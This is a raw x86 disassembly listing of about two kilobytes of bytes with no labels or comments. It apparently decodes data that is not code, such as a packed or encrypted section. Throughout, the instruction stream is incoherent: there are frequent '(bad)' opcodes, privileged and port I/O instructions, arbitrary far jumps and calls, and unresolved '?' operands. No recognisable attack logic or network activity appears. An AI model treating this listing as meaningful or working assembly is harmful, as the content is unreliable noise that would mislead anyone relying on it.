  423425:	fild   DWORD PTR [ebx]
  423427:	out    0x22,al
  423429:	mov    ebp,0xa41976e4
  42342e:	outs   dx,DWORD PTR ds:[esi]
  42342f:	xchg   BYTE PTR [edi],dl
  423431:	or     eax,0x659a1529
  423436:	sub    al,0xac
  423438:	push   cs
  423439:	sub    ch,dl
  42343b:	(bad)  
  42343c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42343d:	push   0x55
  42343f:	test   BYTE PTR [eax+0x2d],al
  423442:	es push ds
  423444:	jmp    0x2e9a:0xbba91388
  42344b:	or     BYTE PTR [esi],bl
  42344d:	addr16 inc ebx
  42344f:	inc    esp
  423450:	push   eax
  423451:	scas   al,BYTE PTR es:[edi]
  423452:	loopne 0x42347e
  423454:	div    BYTE PTR [esi+eax*2+0xc568cd7]
  42345b:	scas   al,BYTE PTR es:[edi]
  42345c:	test   al,0xb4
  42345e:	fsub   DWORD PTR [ecx]
  423460:	ret    0x258b
  423463:	push   ebp
  423464:	jmp    0x7748:0x5e7222be
  42346b:	dec    eax
  42346c:	inc    esp
  42346d:	add    BYTE PTR [ecx-0x1f83eace],ah
  423473:	pop    ebp
  423474:	mov    esi,0x75dcec85
  423479:	xchg   edx,eax
  42347a:	xor    ecx,DWORD PTR [edi+0x7f17025e]
  423480:	shl    ecx,1
  423482:	xchg   esi,eax
  423483:	xchg   ecx,eax
  423484:	mov    ecx,0x30bed502
  423489:	mov    dh,BYTE PTR [ecx-0x62d2f3f4]
  42348f:	es clc 
  423491:	sbb    DWORD PTR [ebx+esi*1+0x52],0x0
	...
  423511:	add    BYTE PTR [eax],al
  423513:	add    dl,dl
  423515:	in     al,dx
  423516:	and    edx,DWORD PTR [ecx]
  423518:	aas    
  423519:	fcomip st,st(2)
  42351b:	out    dx,eax
  42351c:	or     DWORD PTR [esi+0x4f2beacd],ebp
  423522:	or     al,cl
  423524:	ror    ecx,1
  423526:	add    DWORD PTR [eax],eax
  423528:	imul   eax,DWORD PTR [edi],0x68a30000
  42352e:	sbb    bh,BYTE PTR [ebx+edi*8]
  423531:	pop    ss
  423532:	std    
  423533:	in     eax,0x38
  423535:	(bad)  
  423536:	icebp  
  423537:	mov    esp,0xfc47c015
  42353c:	mov    WORD PTR [edx+0x664378da],fs
  423542:	jbe    0x423553
  423544:	cmp    edx,ecx
  423546:	pop    ebp
  423547:	adc    ah,BYTE PTR [ebx+0x45]
  42354a:	cmp    DWORD PTR [edi],ebx
  42354c:	into   
  42354d:	aad    0x15
  42354f:	mov    ds:0x234f642b,al
  423554:	dec    ecx
  423555:	out    0xe1,al
  423557:	mov    ah,0x1d
  423559:	push   ds
  42355a:	jge    0x423550
  42355c:	call   0xe155f816
  423561:	loope  0x4235ce
  423563:	mov    dh,0xf9
  423565:	adc    ecx,DWORD PTR [esi+0x2d95d8bd]
  42356b:	retf   0x74a8
  42356e:	or     BYTE PTR ds:[ebx+eax*8+0x6872542d],0xed
  423577:	ins    DWORD PTR es:[edi],dx
  423578:	mov    edx,?
  42357a:	jl     0x42356c
  42357c:	neg    ebx
  42357e:	(bad)  
  42357f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423580:	and    ebp,ebx
  423582:	out    0x44,al
  423584:	jns    0x423510
  423586:	sub    ebx,DWORD PTR [ecx+esi*2+0x42]
  42358a:	arpl   WORD PTR [ecx],dx
  42358c:	ret    
  42358d:	mov    esp,0xd925f112
  423592:	xchg   esp,eax
  423593:	js     0x4235ee
  423595:	fstp   QWORD PTR [ecx+ecx*4+0x52]
  423599:	xchg   edi,eax
  42359a:	gs js  0x4235cb
  42359d:	call   0xe89c4909
  4235a2:	fwait
  4235a3:	in     al,dx
  4235a4:	mov    dl,0x4d
  4235a6:	dec    eax
  4235a7:	mov    eax,0x961ed59c
  4235ac:	stc    
  4235ad:	mov    dl,BYTE PTR [edx]
  4235af:	sbb    ch,ah
  4235b1:	fdiv   QWORD PTR [ebx]
  4235b3:	js     0x423545
  4235b5:	call   0x7273:0x7f7466be
  4235bc:	mov    ecx,0xc539e3bb
  4235c1:	(bad)  
  4235c3:	addr16 clc 
  4235c5:	or     eax,0x69e1ef22
  4235ca:	in     al,0x71
  4235cc:	arpl   ax,cx
  4235ce:	push   esp
  4235cf:	shl    BYTE PTR [ecx],0x7c
  4235d2:	pop    esp
  4235d3:	cmp    eax,0xff312572
  4235d8:	sbb    bl,bl
  4235da:	pop    eax
  4235db:	sub    al,BYTE PTR [eax+edi*1]
  4235de:	lock es mov ebp,0x35fc2ef0
  4235e5:	pop    es
  4235e6:	jno    0x42356a
  4235e8:	scas   al,BYTE PTR es:[edi]
  4235e9:	add    DWORD PTR [edx-0x7c],edi
  4235ec:	mov    BYTE PTR [eax-0x1c],ah
  4235ef:	fs inc esp
  4235f1:	fild   WORD PTR [esi+0x2b3b463d]
  4235f7:	ins    DWORD PTR es:[edi],dx
  4235f8:	mov    DWORD PTR [edx-0x371594c7],esi
  4235fe:	dec    esi
  4235ff:	inc    esi
  423600:	(bad)  
  423601:	push   0x432ed0a9
  423606:	and    eax,0x5f1c7faf
  42360b:	xor    eax,0x2b86d9d8
  423610:	fldenv [esi+esi*4-0x70]
  423614:	scas   eax,DWORD PTR es:[edi]
  423615:	push   edi
  423616:	fcompp 
  423618:	cmc    
  423619:	jne    0x4235aa
  42361b:	repz aam 0x18
  42361e:	jecxz  0x42361a
  423620:	mov    edx,0x20dc382b
  423625:	add    eax,0x24d40e83
  42362a:	ins    DWORD PTR es:[edi],dx
  42362b:	jle    0x4235f4
  42362d:	inc    ecx
  42362e:	(bad)  
  423630:	adc    DWORD PTR [ecx+ebp*1-0x9b34a34],ebx
  423637:	jmp    0x5c13:0xea1cf23d
  42363e:	fisttp WORD PTR [edi]
  423640:	out    dx,eax
  423641:	or     ebx,DWORD PTR [edi+0x7]
  423644:	sub    ebp,edx
  423646:	(bad)  
  423647:	addr16 retf 
  423649:	dec    edx
  42364a:	inc    edi
  42364b:	push   edi
  42364c:	xor    DWORD PTR [esi],ecx
  42364e:	arpl   WORD PTR [edi+0x9],bp
  423651:	dec    bl
  423653:	mov    bh,0xe
  423655:	out    dx,eax
  423656:	aam    0x84
  423658:	mov    ds:0x215ffa66,al
  42365d:	inc    ebx
  42365e:	xchg   edi,eax
  42365f:	loope  0x4236dd
  423661:	inc    edx
  423662:	call   0x35d4073c
  423667:	push   ds
  423668:	pop    edx
  423669:	jbe    0x423657
  42366b:	xchg   edx,eax
  42366c:	sbb    eax,0xe4eac39d
  423671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423672:	scas   al,BYTE PTR es:[edi]
  423673:	push   edx
  423674:	dec    eax
  423675:	adc    esi,DWORD PTR [edx]
  423677:	inc    ebp
  423679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42367a:	rcr    BYTE PTR [edx+0x37],0x8d
  42367e:	inc    ecx
  42367f:	fnstsw WORD PTR [ebx+0x18]
  423682:	push   0x5d98ce45
  423687:	clc    
  423688:	loope  0x4236a6
  42368a:	push   edi
  42368b:	inc    esp
  42368c:	scas   eax,DWORD PTR es:[edi]
  42368d:	dec    edi
  42368e:	lods   al,BYTE PTR ds:[esi]
  42368f:	jp     0x423625
  423691:	test   al,0xa0
  423693:	in     eax,0x8a
  423695:	sub    al,BYTE PTR ds:0xb6a496ac
  42369b:	test   eax,0x1eb85e82
  4236a0:	mov    edi,?
  4236a2:	fimul  DWORD PTR [edi]
  4236a4:	out    dx,eax
  4236a5:	daa    
  4236a6:	and    esi,edi
  4236a8:	sub    al,BYTE PTR [esi+ebx*8+0x5582c5e4]
  4236af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236b0:	scas   al,BYTE PTR es:[edi]
  4236b1:	cld    
  4236b2:	test   eax,0xaad523cb
  4236b7:	aam    0x4f
  4236b9:	xor    esp,ebp
  4236bb:	add    al,bl
  4236bd:	cwde   
  4236be:	jae    0x4236c2
  4236c0:	popa   
  4236c1:	cmp    esi,ecx
  4236c3:	adc    eax,0x2afbae8e
  4236c8:	sub    edi,ebx
  4236ca:	in     eax,dx
  4236cb:	sbb    DWORD PTR [ebx],ebx
  4236cd:	outs   dx,DWORD PTR ds:[esi]
  4236ce:	ror    DWORD PTR ds:0xcd28acb3,cl
  4236d4:	retf   
  4236d5:	xchg   esi,eax
  4236d6:	aas    
  4236d7:	pop    edx
  4236d8:	sub    al,0x7f
  4236da:	in     al,dx
  4236db:	sub    bh,dh
  4236dd:	jle    0x423703
  4236df:	push   esp
  4236e0:	mov    eax,0xa984ed9a
  4236e5:	ror    BYTE PTR [ebp+0x4],1
  4236e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236e9:	sub    al,0x7
  4236eb:	xchg   DWORD PTR [esi+0x5458efbb],edx
  4236f1:	xchg   esi,eax
  4236f2:	pushf  
  4236f3:	jl     0x4236f1
  4236f5:	xor    BYTE PTR [ebp+0x2f833c63],ch
  4236fb:	adc    eax,0xebb591ff
  423700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423701:	call   0x74f8:0x197e4896
  423708:	mov    bl,0x35
  42370a:	xchg   edx,eax
  42370b:	dec    ecx
  42370c:	jo     0x423727
  42370e:	push   ebp
  42370f:	pop    ss
  423710:	dec    ebp
  423711:	or     DWORD PTR [ecx-0x61cdfe17],ecx
  423717:	pusha  
  423718:	dec    eax
  423719:	rcr    BYTE PTR [ecx-0x1d03250d],1
  42371f:	out    dx,eax
  423720:	xchg   edx,eax
  423721:	sbb    edx,DWORD PTR [edi+0x7a]
  423724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423725:	imul   esi,esp,0xffffffe5
  423728:	aad    0xb5
  42372a:	in     eax,dx
  42372b:	push   cs
  42372c:	data16 ja 0x4236c7
  42372f:	mov    al,0x95
  423731:	xchg   esi,eax
  423732:	les    edi,FWORD PTR [eax]
  423734:	mov    bl,0x37
  423736:	sub    al,0x8
  423738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423739:	cld    
  42373a:	or     bl,BYTE PTR [ebp+0x14]
  42373d:	sahf   
  42373e:	fwait
  42373f:	adc    BYTE PTR [edi+ecx*8-0x25c2ef5f],ch
  423746:	mov    es,WORD PTR [esi+0x3d764931]
  42374c:	jne    0x4237b7
  42374e:	(bad)  
  42374f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423750:	jl     0x4236f2
  423752:	arpl   ax,bp
  423754:	and    al,0x57
  423756:	test   eax,0x4edf0182
  42375b:	jno    0x423791
  42375d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42375e:	scas   eax,DWORD PTR es:[edi]
  42375f:	jle    0x42374e
  423761:	sub    BYTE PTR [ebx],al
  423763:	or     eax,0xf3e031ec
  423768:	dec    ebx
  423769:	repz push 0x67
  42376c:	in     al,0x77
  42376e:	into   
  42376f:	pop    eax
  423770:	(bad)  
  423772:	xor    al,0x3
  423774:	xchg   BYTE PTR [ebp+0x43c22f09],dh
  42377a:	push   ss
  42377b:	xor    BYTE PTR [eax-0x63],ah
  42377e:	and    ch,al
  423780:	hlt    
  423781:	mov    ebp,0xd34be20
  423786:	xor    cl,BYTE PTR [esi-0xe]
  423789:	dec    edx
  42378a:	pushf  
  42378b:	cdq    
  42378c:	jbe    0x42375d
  42378e:	sbb    bh,ah
  423790:	push   ss
  423791:	cmp    DWORD PTR ds:0x3321e159,0xffffffd5
  423798:	push   eax
  423799:	nop
  42379a:	pop    ss
  42379b:	xchg   ebp,eax
  42379c:	ja     0x423807
  42379e:	or     eax,0xd64fe5ae
  4237a3:	call   0xee78:0xd3251b2
  4237aa:	hlt    
  4237ab:	mov    fs,WORD PTR [eax-0x16]
  4237ae:	std    
  4237af:	adc    eax,0x32d10423
  4237b4:	pop    ebp
  4237b5:	jl     0x42376c
  4237b7:	dec    eax
  4237b8:	xor    eax,DWORD PTR [esi-0x12a14874]
  4237be:	sbb    eax,0xdaea2d6f
  4237c3:	int3   
  4237c4:	pop    ebp
  4237c5:	aad    0x37
  4237c7:	in     al,0x1a
  4237c9:	or     BYTE PTR [ebx+0x72887240],bh
  4237cf:	push   esp
  4237d0:	dec    edx
  4237d1:	sub    eax,0xa93b9694
  4237d6:	icebp  
  4237d7:	arpl   WORD PTR [esi+0x37971ef1],bp
  4237dd:	push   esp
  4237de:	sbb    esi,DWORD PTR [ecx-0x1989f3ef]
  4237e4:	add    DWORD PTR [esi],ebx
  4237e6:	test   al,0xd9
  4237e8:	jle    0x423784
  4237ea:	xor    eax,0xd4c87682
  4237ef:	shl    DWORD PTR [ebp+0x25ee9474],1
  4237f5:	push   ds
  4237f6:	mov    dl,0xed
  4237f8:	popf   
  4237f9:	dec    edx
  4237fa:	daa    
  4237fb:	repnz mov esp,0xcb4c751d
  423801:	dec    ebx
  423802:	test   dl,0x22
  423805:	mov    ah,0x9e
  423807:	out    dx,al
  423808:	lods   al,BYTE PTR ds:[esi]
  423809:	pop    edx
  42380a:	cmp    al,ah
  42380c:	push   es
  42380d:	jp     0x4237d9
  42380f:	pop    ebx
  423810:	mov    al,0x4e
  423812:	sub    BYTE PTR [esi+edi*4+0xa],bh
  423816:	int    0xf8
  423818:	hlt    
  423819:	jns    0x4237bb
  42381b:	or     eax,0x4ad53e31
  423820:	add    ebp,edi
  423822:	xchg   DWORD PTR [ebp-0x372b58e3],ebx
  423828:	dec    esi
  423829:	out    0xd2,al
  42382b:	jmp    0x58253de5
  423830:	cs push esi
  423832:	or     al,0xe4
  423834:	imul   ebx,ebp,0x35
  423837:	jecxz  0x42389e
  423839:	fbstp  TBYTE PTR [esi]
  42383b:	mov    ch,0x41
  42383d:	scas   eax,DWORD PTR es:[edi]
  42383e:	sub    eax,0x26694f2d
  423843:	jg     0x42388c
  423845:	out    dx,eax
  423846:	test   eax,0xc718f474
  42384b:	inc    ebp
  42384c:	mov    eax,0xadb05ffd
  423851:	cmc    
  423852:	icebp  
  423853:	pop    es
  423854:	cmp    al,0x94
  423856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423857:	add    eax,0x62a076e1
  42385c:	jge    0x4237f5
  42385e:	ds popf 
  423860:	ins    DWORD PTR es:[edi],dx
  423861:	lea    ebx,[ecx+0x16a732f0]
  423867:	ret    
  423868:	push   es
  423869:	sub    DWORD PTR [esi],esi
  42386b:	mov    ch,0xb1
  42386d:	sbb    al,0xd3
  42386f:	add    ebx,DWORD PTR [ecx-0x76]
  423872:	gs sub al,0xbd
  423875:	mov    ebx,0x5cd0e853
  42387a:	call   0xf4ac:0x281d28b8
  423881:	loopne 0x42384d
  423883:	push   cs
  423884:	sbb    DWORD PTR [edx],eax
  423886:	sub    DWORD PTR [ebx+ebx*4-0x16],0xffffff89
  42388b:	push   0x19
  42388d:	cmp    ah,BYTE PTR fs:[ecx+0x5]
  423891:	pop    DWORD PTR [ecx-0x39]
  423894:	cmp    al,0xd2
  423896:	mov    bl,0x16
  423898:	mov    DWORD PTR [ecx+0x64],ecx
  42389b:	test   DWORD PTR [ebx+0x778debd0],edi
  4238a1:	sti    
  4238a2:	arpl   WORD PTR [esi+0x67],si
  4238a5:	sbb    eax,0xef30b304
  4238aa:	or     eax,esi
  4238ac:	inc    edx
  4238ad:	mov    al,0x75
  4238af:	pop    esi
  4238b0:	ins    BYTE PTR es:[edi],dx
  4238b1:	addr16 aam 0x74
  4238b4:	xlat   BYTE PTR ds:[ebx]
  4238b5:	adc    eax,0x86918ecc
  4238ba:	and    al,0xa0
  4238bc:	mov    esp,0x441a2ad5
  4238c1:	test   al,0xf4
  4238c3:	(bad)  
  4238c4:	fsub   QWORD PTR [edx+ecx*1-0x51]
  4238c8:	xor    al,0xca
  4238ca:	imul   esi,DWORD PTR [edx],0xffffff9f
  4238cd:	fnclex 
  4238cf:	mov    bl,0xed
  4238d1:	xor    bh,BYTE PTR [ecx]
  4238d3:	or     DWORD PTR [ecx],0x4cf2160c
  4238d9:	lock or cl,dh
  4238dc:	sbb    bh,ch
  4238de:	mov    ch,0x30
  4238e0:	(bad)  
  4238e2:	repz inc esi
  4238e4:	and    ch,BYTE PTR [ebx+0x40]
  4238e7:	cmc    
  4238e8:	cwde   
  4238e9:	mov    bl,0x48
  4238eb:	cmp    BYTE PTR [edi-0x5b],bh
  4238ee:	fwait
  4238ef:	scas   eax,DWORD PTR es:[edi]
  4238f0:	xor    eax,0x38dd7869
  4238f5:	cwde   
  4238f6:	and    BYTE PTR [esi],0x24
  4238f9:	les    eax,FWORD PTR [edi+0x38]
  4238fc:	and    ecx,DWORD PTR [edx+0x7be7da5f]
  423902:	cmp    DWORD PTR [eax-0x62],ebp
  423905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423906:	ins    BYTE PTR es:[edi],dx
  423907:	and    ah,BYTE PTR [ecx+0x10619fb0]
  42390d:	fcomp  QWORD PTR [ebp-0x4]
  423910:	mov    WORD PTR [edx],gs
  423912:	sbb    al,0xd5
  423914:	sub    al,0xa6
  423916:	sti    
  423917:	push   es
  423918:	jle    0x42390e
  42391a:	add    BYTE PTR [eax+0x7f19fd06],dl
  423920:	test   al,0xe9
  423922:	enter  0x99f8,0x7a
  423926:	pop    es
  423927:	push   ds
  423928:	lahf   
  423929:	push   0xfffffff5
  42392b:	int3   
  42392c:	daa    
  42392d:	cld    
  42392e:	or     bl,BYTE PTR [ebx-0x1d]
  423931:	and    DWORD PTR [edi-0x13],eax
  423934:	fs push esp
  423936:	mov    ax,ds:0x9159104a
  42393c:	add    edi,edi
  42393e:	std    
  42393f:	fcmovne st,st(7)
  423941:	rcr    ch,cl
  423943:	arpl   cx,si
  423945:	add    edi,DWORD PTR [ebx+eiz*1+0x1f]
  423949:	and    al,0xa5
  42394b:	mov    cl,0x83
  42394d:	dec    esi
  42394e:	sbb    al,0xec
  423950:	push   eax
  423951:	and    eax,0x9ab3bcd1
  423956:	pushf  
  423957:	mov    ebx,0x2bff2856
  42395c:	mov    al,ds:0xddfe0ca0
  423961:	ldmxcsr DWORD PTR [edx+0x637d280]
  423968:	mov    bl,0x2b
  42396a:	leave  
  42396b:	mov    esp,0x5f5238ed
  423970:	cmp    BYTE PTR [esi-0x22],bh
  423973:	gs or  eax,0xa049527a
  423979:	fs sub eax,0x65ea7b4d
  42397f:	into   
  423980:	enter  0x4b21,0x6e
  423984:	fmul   DWORD PTR [edi]
  423986:	outs   dx,BYTE PTR ds:[esi]
  423987:	and    edx,DWORD PTR [esi-0x1]
  42398a:	ja     0x423934
  42398c:	data16 and bh,BYTE PTR [esi-0x10]
  423990:	push   ecx
  423991:	jbe    0x4239fe
  423993:	dec    esp
  423994:	xor    eax,0x364b6325
  423999:	les    edi,FWORD PTR [edi]
  42399b:	push   edx
  42399c:	mov    eax,ds:0xbefbae32
  4239a1:	jo     0x423951
  4239a3:	call   0x2088:0x5860124f
  4239aa:	sub    ebx,DWORD PTR [edx]
  4239ac:	(bad)  
  4239ad:	jl     0x423945
  4239af:	inc    ebp
  4239b0:	and    al,0x37
  4239b2:	or     DWORD PTR [edi-0x5b],eax
  4239b5:	pop    ebx
  4239b6:	popf   
  4239b7:	push   ss
  4239b8:	aad    0x75
  4239ba:	lock data16 jp 0x423946
  4239be:	or     BYTE PTR [eax+0x401a5790],dl
  4239c4:	push   ds
  4239c5:	lods   al,BYTE PTR ds:[esi]
  4239c6:	retf   
  4239c7:	xor    cl,BYTE PTR ds:[edi-0x47]
  4239cb:	lahf   
  4239cc:	inc    ecx
  4239cd:	and    ebp,esp
  4239cf:	pop    edi
  4239d0:	jg     0x423965
  4239d2:	int    0x21
  4239d4:	rcr    BYTE PTR [eax],cl
  4239d6:	stc    
  4239d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239d8:	mov    ebx,0xc4784e64
  4239dd:	pop    ds
  4239de:	push   cs
  4239df:	sub    esp,DWORD PTR ds:0x2b3b744a
  4239e5:	bound  ecx,QWORD PTR [ebx-0x64]
  4239e8:	and    eax,0x3f737722
  4239ed:	jecxz  0x423a6a
  4239ef:	fwait
  4239f0:	std    
  4239f1:	in     eax,dx
  4239f2:	mov    al,ds:0xf93964ae
  4239f7:	add    ebx,ecx
  4239f9:	xor    edi,edi
  4239fb:	hlt    
  4239fc:	push   ecx
  4239fd:	mov    dl,bl
  4239ff:	ret    
  423a00:	fstp   TBYTE PTR [ecx-0x4c]
  423a03:	cmp    eax,0xe7c11d1b
  423a08:	sbb    ebp,edi
  423a0a:	jo     0x423a2f
  423a0c:	das    
  423a0d:	mov    ch,0xba
  423a0f:	xchg   esp,eax
  423a10:	sbb    al,0x7c
  423a12:	enter  0xb47c,0x99
  423a16:	xchg   ecx,eax
  423a17:	pop    eax
  423a18:	mul    DWORD PTR [eax]
  423a1a:	scas   eax,DWORD PTR es:[edi]
  423a1b:	mov    ds:0xd6cde6,al
  423a20:	jl     0x423a25
  423a22:	repnz mov dl,cl
  423a25:	test   DWORD PTR [ecx],esi
  423a27:	aaa    
  423a28:	push   ecx
  423a29:	cld    
  423a2a:	mov    edx,0x3df6f6d4
  423a2f:	hlt    
  423a30:	jg     0x4239d1
  423a32:	lahf   
  423a33:	dec    esi
  423a34:	scas   eax,DWORD PTR es:[edi]
  423a35:	pop    ds
  423a36:	(bad)  
  423a37:	sbb    cl,BYTE PTR [edi+edx*2-0x30]
  423a3b:	jno    0x4239c3
  423a3d:	jae    0x423a11
  423a3f:	adc    eax,0x2acb5617
  423a44:	add    BYTE PTR [edi],dh
  423a46:	fs push ecx
  423a48:	sub    edx,DWORD PTR [edi-0x2e]
  423a4b:	jo     0x423aa1
  423a4d:	push   ebp
  423a4e:	pop    ss
  423a4f:	fucomip st,st(6)
  423a51:	xor    al,0xff
  423a53:	mov    ?,WORD PTR [ebp+0x36cde5b8]
  423a59:	cmp    ebx,DWORD PTR [edi]
  423a5b:	std    
  423a5c:	add    al,0xfa
  423a5e:	xor    dl,BYTE PTR [ebp+0x70cede7]
  423a64:	addr16 pop edi
  423a66:	clc    
  423a67:	ror    BYTE PTR [esi-0x12969518],1
  423a6d:	inc    ecx
  423a6e:	(bad)  
  423a6f:	cmp    edx,DWORD PTR [ebx]
  423a71:	rol    BYTE PTR [ebp+0x4d],cl
  423a74:	xor    BYTE PTR [esi-0x4],dl
  423a77:	call   DWORD PTR [edx+eax*2+0xe690b0a]
  423a7e:	(bad)  
  423a7f:	mov    bl,0x8f
  423a81:	xor    esp,DWORD PTR [ecx+0x3d]
  423a84:	mov    WORD PTR [ebp-0x2b],ss
  423a87:	push   esi
  423a88:	or     dh,ch
  423a8a:	sub    BYTE PTR [esi+esi*2+0x8],ch
  423a8e:	push   ebp
  423a8f:	jp     0x423ac5
  423a91:	mov    esi,0x3464db87
  423a96:	and    ecx,esi
  423a98:	xchg   edx,eax
  423a99:	xlat   BYTE PTR ds:[ebx]
  423a9a:	xchg   ebx,eax
  423a9b:	add    DWORD PTR [ebx+0x5d],0x5463f37a
  423aa2:	rol    DWORD PTR [edx],cl
  423aa4:	dec    eax
  423aa5:	dec    edi
  423aa6:	clc    
  423aa7:	cmp    bl,BYTE PTR [ecx-0x5b01fabc]
  423aad:	fcomp  DWORD PTR [esi+edi*8]
  423ab0:	in     eax,dx
  423ab1:	xor    bl,BYTE PTR [esi-0x79]
  423ab4:	sbb    eax,0xd4950fc0
  423ab9:	cli    
  423aba:	sub    ah,BYTE PTR [esi+0x4a2ec9d1]
  423ac0:	jns    0x423a7e
  423ac2:	mov    edx,0xbca70f7c
  423ac7:	xor    ecx,esi
  423ac9:	jo     0x423abd
  423acb:	add    DWORD PTR [ebp+ebx*1+0x3f],0x53
  423ad0:	ins    DWORD PTR es:[edi],dx
  423ad1:	mov    BYTE PTR [edi],0xf
  423ad4:	in     al,0xc6
  423ad6:	push   edx
  423ad7:	and    al,0xf9
  423ad9:	ds dec ebx
  423adb:	inc    esi
  423adc:	and    BYTE PTR [esi-0x78e2b3ca],ah
  423ae2:	les    ebp,FWORD PTR [ebp+0x5f50cd82]
  423ae8:	adc    DWORD PTR [edi],esi
  423aea:	mov    DWORD PTR [edi-0x4a],edx
  423aed:	adc    ch,BYTE PTR [esi+0x1f57a5e8]
  423af3:	inc    eax
  423af4:	or     ch,ah
  423af6:	mov    ch,0xa2
  423af8:	out    dx,al
  423af9:	adc    ecx,DWORD PTR [edx-0x2552e034]
  423aff:	or     ebp,DWORD PTR [eax]
  423b01:	jl     0x423adb
  423b03:	push   esi
  423b04:	cmc    
  423b05:	dec    esp
  423b06:	xchg   esp,eax
  423b07:	sbb    DWORD PTR [esi+ebx*8],esi
  423b0a:	fs shr BYTE PTR es:[esp+eiz*4],1
  423b0f:	pop    esi
  423b10:	(bad)  
  423b11:	pop    es
  423b12:	pop    ss
  423b13:	ds xchg esi,eax
  423b15:	stc    
  423b16:	dec    eax
  423b17:	xchg   esi,eax
  423b18:	xor    eax,0xe69fd0c9
  423b1d:	xlat   BYTE PTR ds:[ebx]
  423b1e:	data16 mov bh,0x6d
  423b21:	xor    eax,0xff59fbcc
  423b26:	jp     0x423b33
  423b28:	lock push ecx
  423b2a:	xor    BYTE PTR [edi+0x34f86f85],dh
  423b30:	in     al,0x48
  423b32:	es xor al,0xd9
  423b35:	loope  0x423b71
  423b37:	xchg   ebp,eax
  423b38:	aaa    
  423b39:	inc    edi
  423b3a:	cmp    eax,0x9d013e5f
  423b3f:	loope  0x423acb
  423b41:	xchg   BYTE PTR cs:[edx+0x54],al
  423b45:	jp     0x423b92
  423b47:	and    DWORD PTR [edi-0x31e4dd07],esp
  423b4d:	mov    ebx,0x6df87571
  423b52:	push   ebx
  423b53:	jnp    0x423ae1
  423b55:	leave  
  423b56:	or     al,0x51
  423b58:	cmp    al,0xf8
  423b5a:	sahf   
  423b5b:	jmp    0xada24870
  423b60:	dec    esp
  423b61:	hlt    
  423b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b63:	push   edx
  423b64:	cdq    
  423b65:	jno    0x423bb8
  423b67:	cmp    cl,BYTE PTR [edi+0x30]
  423b6a:	ins    DWORD PTR es:[edi],dx
  423b6b:	pusha  
  423b6c:	sbb    ecx,DWORD PTR [esi]
  423b6e:	sbb    BYTE PTR ds:0x9ee73693,dl
  423b74:	sub    DWORD PTR [edx+ebp*8+0x4b2f5ac2],0xf8a7ff40
  423b7f:	mov    ch,0x17
  423b81:	hlt    
  423b82:	ret    0x8889
  423b85:	aam    0x3a
  423b87:	mov    ecx,0x15f24e8b
  423b8c:	cs jmp 0x8f50:0x4116d1a6
  423b94:	ret    
  423b95:	mov    edx,DWORD PTR [esi+edx*2-0x3f]
  423b99:	pop    eax
  423b9a:	jae    0x423bc5
  423b9c:	sub    edx,ebx
  423b9e:	pop    edx
  423b9f:	xchg   edi,eax
  423ba0:	inc    ebx
  423ba1:	popa   
  423ba2:	enter  0x7658,0xe1
  423ba6:	dec    ebp
  423ba7:	popf   
  423ba8:	repz sbb BYTE PTR [ebx],dl
  423bab:	xchg   bh,ch
  423bad:	xor    BYTE PTR [edx-0x71],cl
  423bb0:	xchg   ecx,eax
  423bb1:	pop    es
  423bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bb3:	push   edx
  423bb4:	outs   dx,BYTE PTR ds:[esi]
  423bb5:	mov    ds:0xe34708b6,eax
  423bba:	mov    ecx,0x1456f04f
  423bbf:	sti    
  423bc0:	stos   DWORD PTR es:[edi],eax
  423bc1:	dec    ebp
  423bc2:	jmp    0x44b5:0x5ef29a03
  423bc9:	int    0xaf
  423bcb:	xor    BYTE PTR [edx],0xc3
  423bce:	repz shl BYTE PTR [ebp+0x16],0x4f
  423bd3:	dec    esi
  423bd4:	leave  
  423bd5:	push   ecx
  423bd6:	mov    ds:0x271d21ba,eax
  423bdb:	ret    0xf0a9
  423bde:	cmp    BYTE PTR [edx+0x71],bl
  423be1:	dec    edi
  423be2:	sar    BYTE PTR [eax+0x75],1
  423be5:	add    edx,DWORD PTR [edi-0x72]
  423be8:	sub    eax,0x4fd19fcc
  423bed:	fucompp 
  423bef:	mov    eax,ds:0xfc8b6851
  423bf4:	jmp    0x2999dbd7
  423bf9:	fwait
  423bfa:	mov    ebx,ebx
  423bfc:	mov    dh,0x40
  423bfe:	xchg   ecx,eax
  423bff:	stos   DWORD PTR es:[edi],eax
  423c00:	mov    es,WORD PTR [ebx]
  423c02:	test   DWORD PTR [edi-0x19],ecx
  423c05:	gs (bad) 
  423c07:	dec    eax
  423c08:	fild   WORD PTR [ebx+0x7a52997f]
  423c0e:	and    DWORD PTR [ecx],0xbfd9685
  423c14:	je     0x423c0c
  423c16:	call   0x5a667449
  423c1b:	cmp    BYTE PTR [ecx-0x53],dh
  423c1e:	retf   0x9f6b
  423c21:	mov    ah,0x2f
  423c23:	dec    ebx
  423c24:	and    edi,edi
  423c26:	cdq    
  423c27:	outs   dx,BYTE PTR ds:[esi]
  423c28:	in     al,dx
  423c29:	sub    ch,BYTE PTR [ebp-0x67ebb771]
  423c2f:	push   edx
  423c30:	aam    0x5
  423c32:	mov    DWORD PTR [edi+0x1ab3e752],esp
  423c38:	sub    eax,0x3ea25822
  423c3d:	das    
  423c3e:	jmp    0x423c79
  423c40:	ins    BYTE PTR es:[edi],dx
  423c41:	loopne 0x423c16
  423c43:	pop    edi
  423c44:	out    dx,al
  423c45:	js     0x423c69
  423c47:	lds    esp,FWORD PTR [ebx-0x5fd300f5]
  423c4d:	data16 mov bl,al
  423c50:	mov    bl,0x28
  423c52:	adc    esi,DWORD PTR [ecx]
  423c54:	into   
  423c55:	sar    BYTE PTR [edx-0x6b],1
  423c58:	cmp    al,0xae
  423c5a:	aas    
  423c5b:	pop    edx
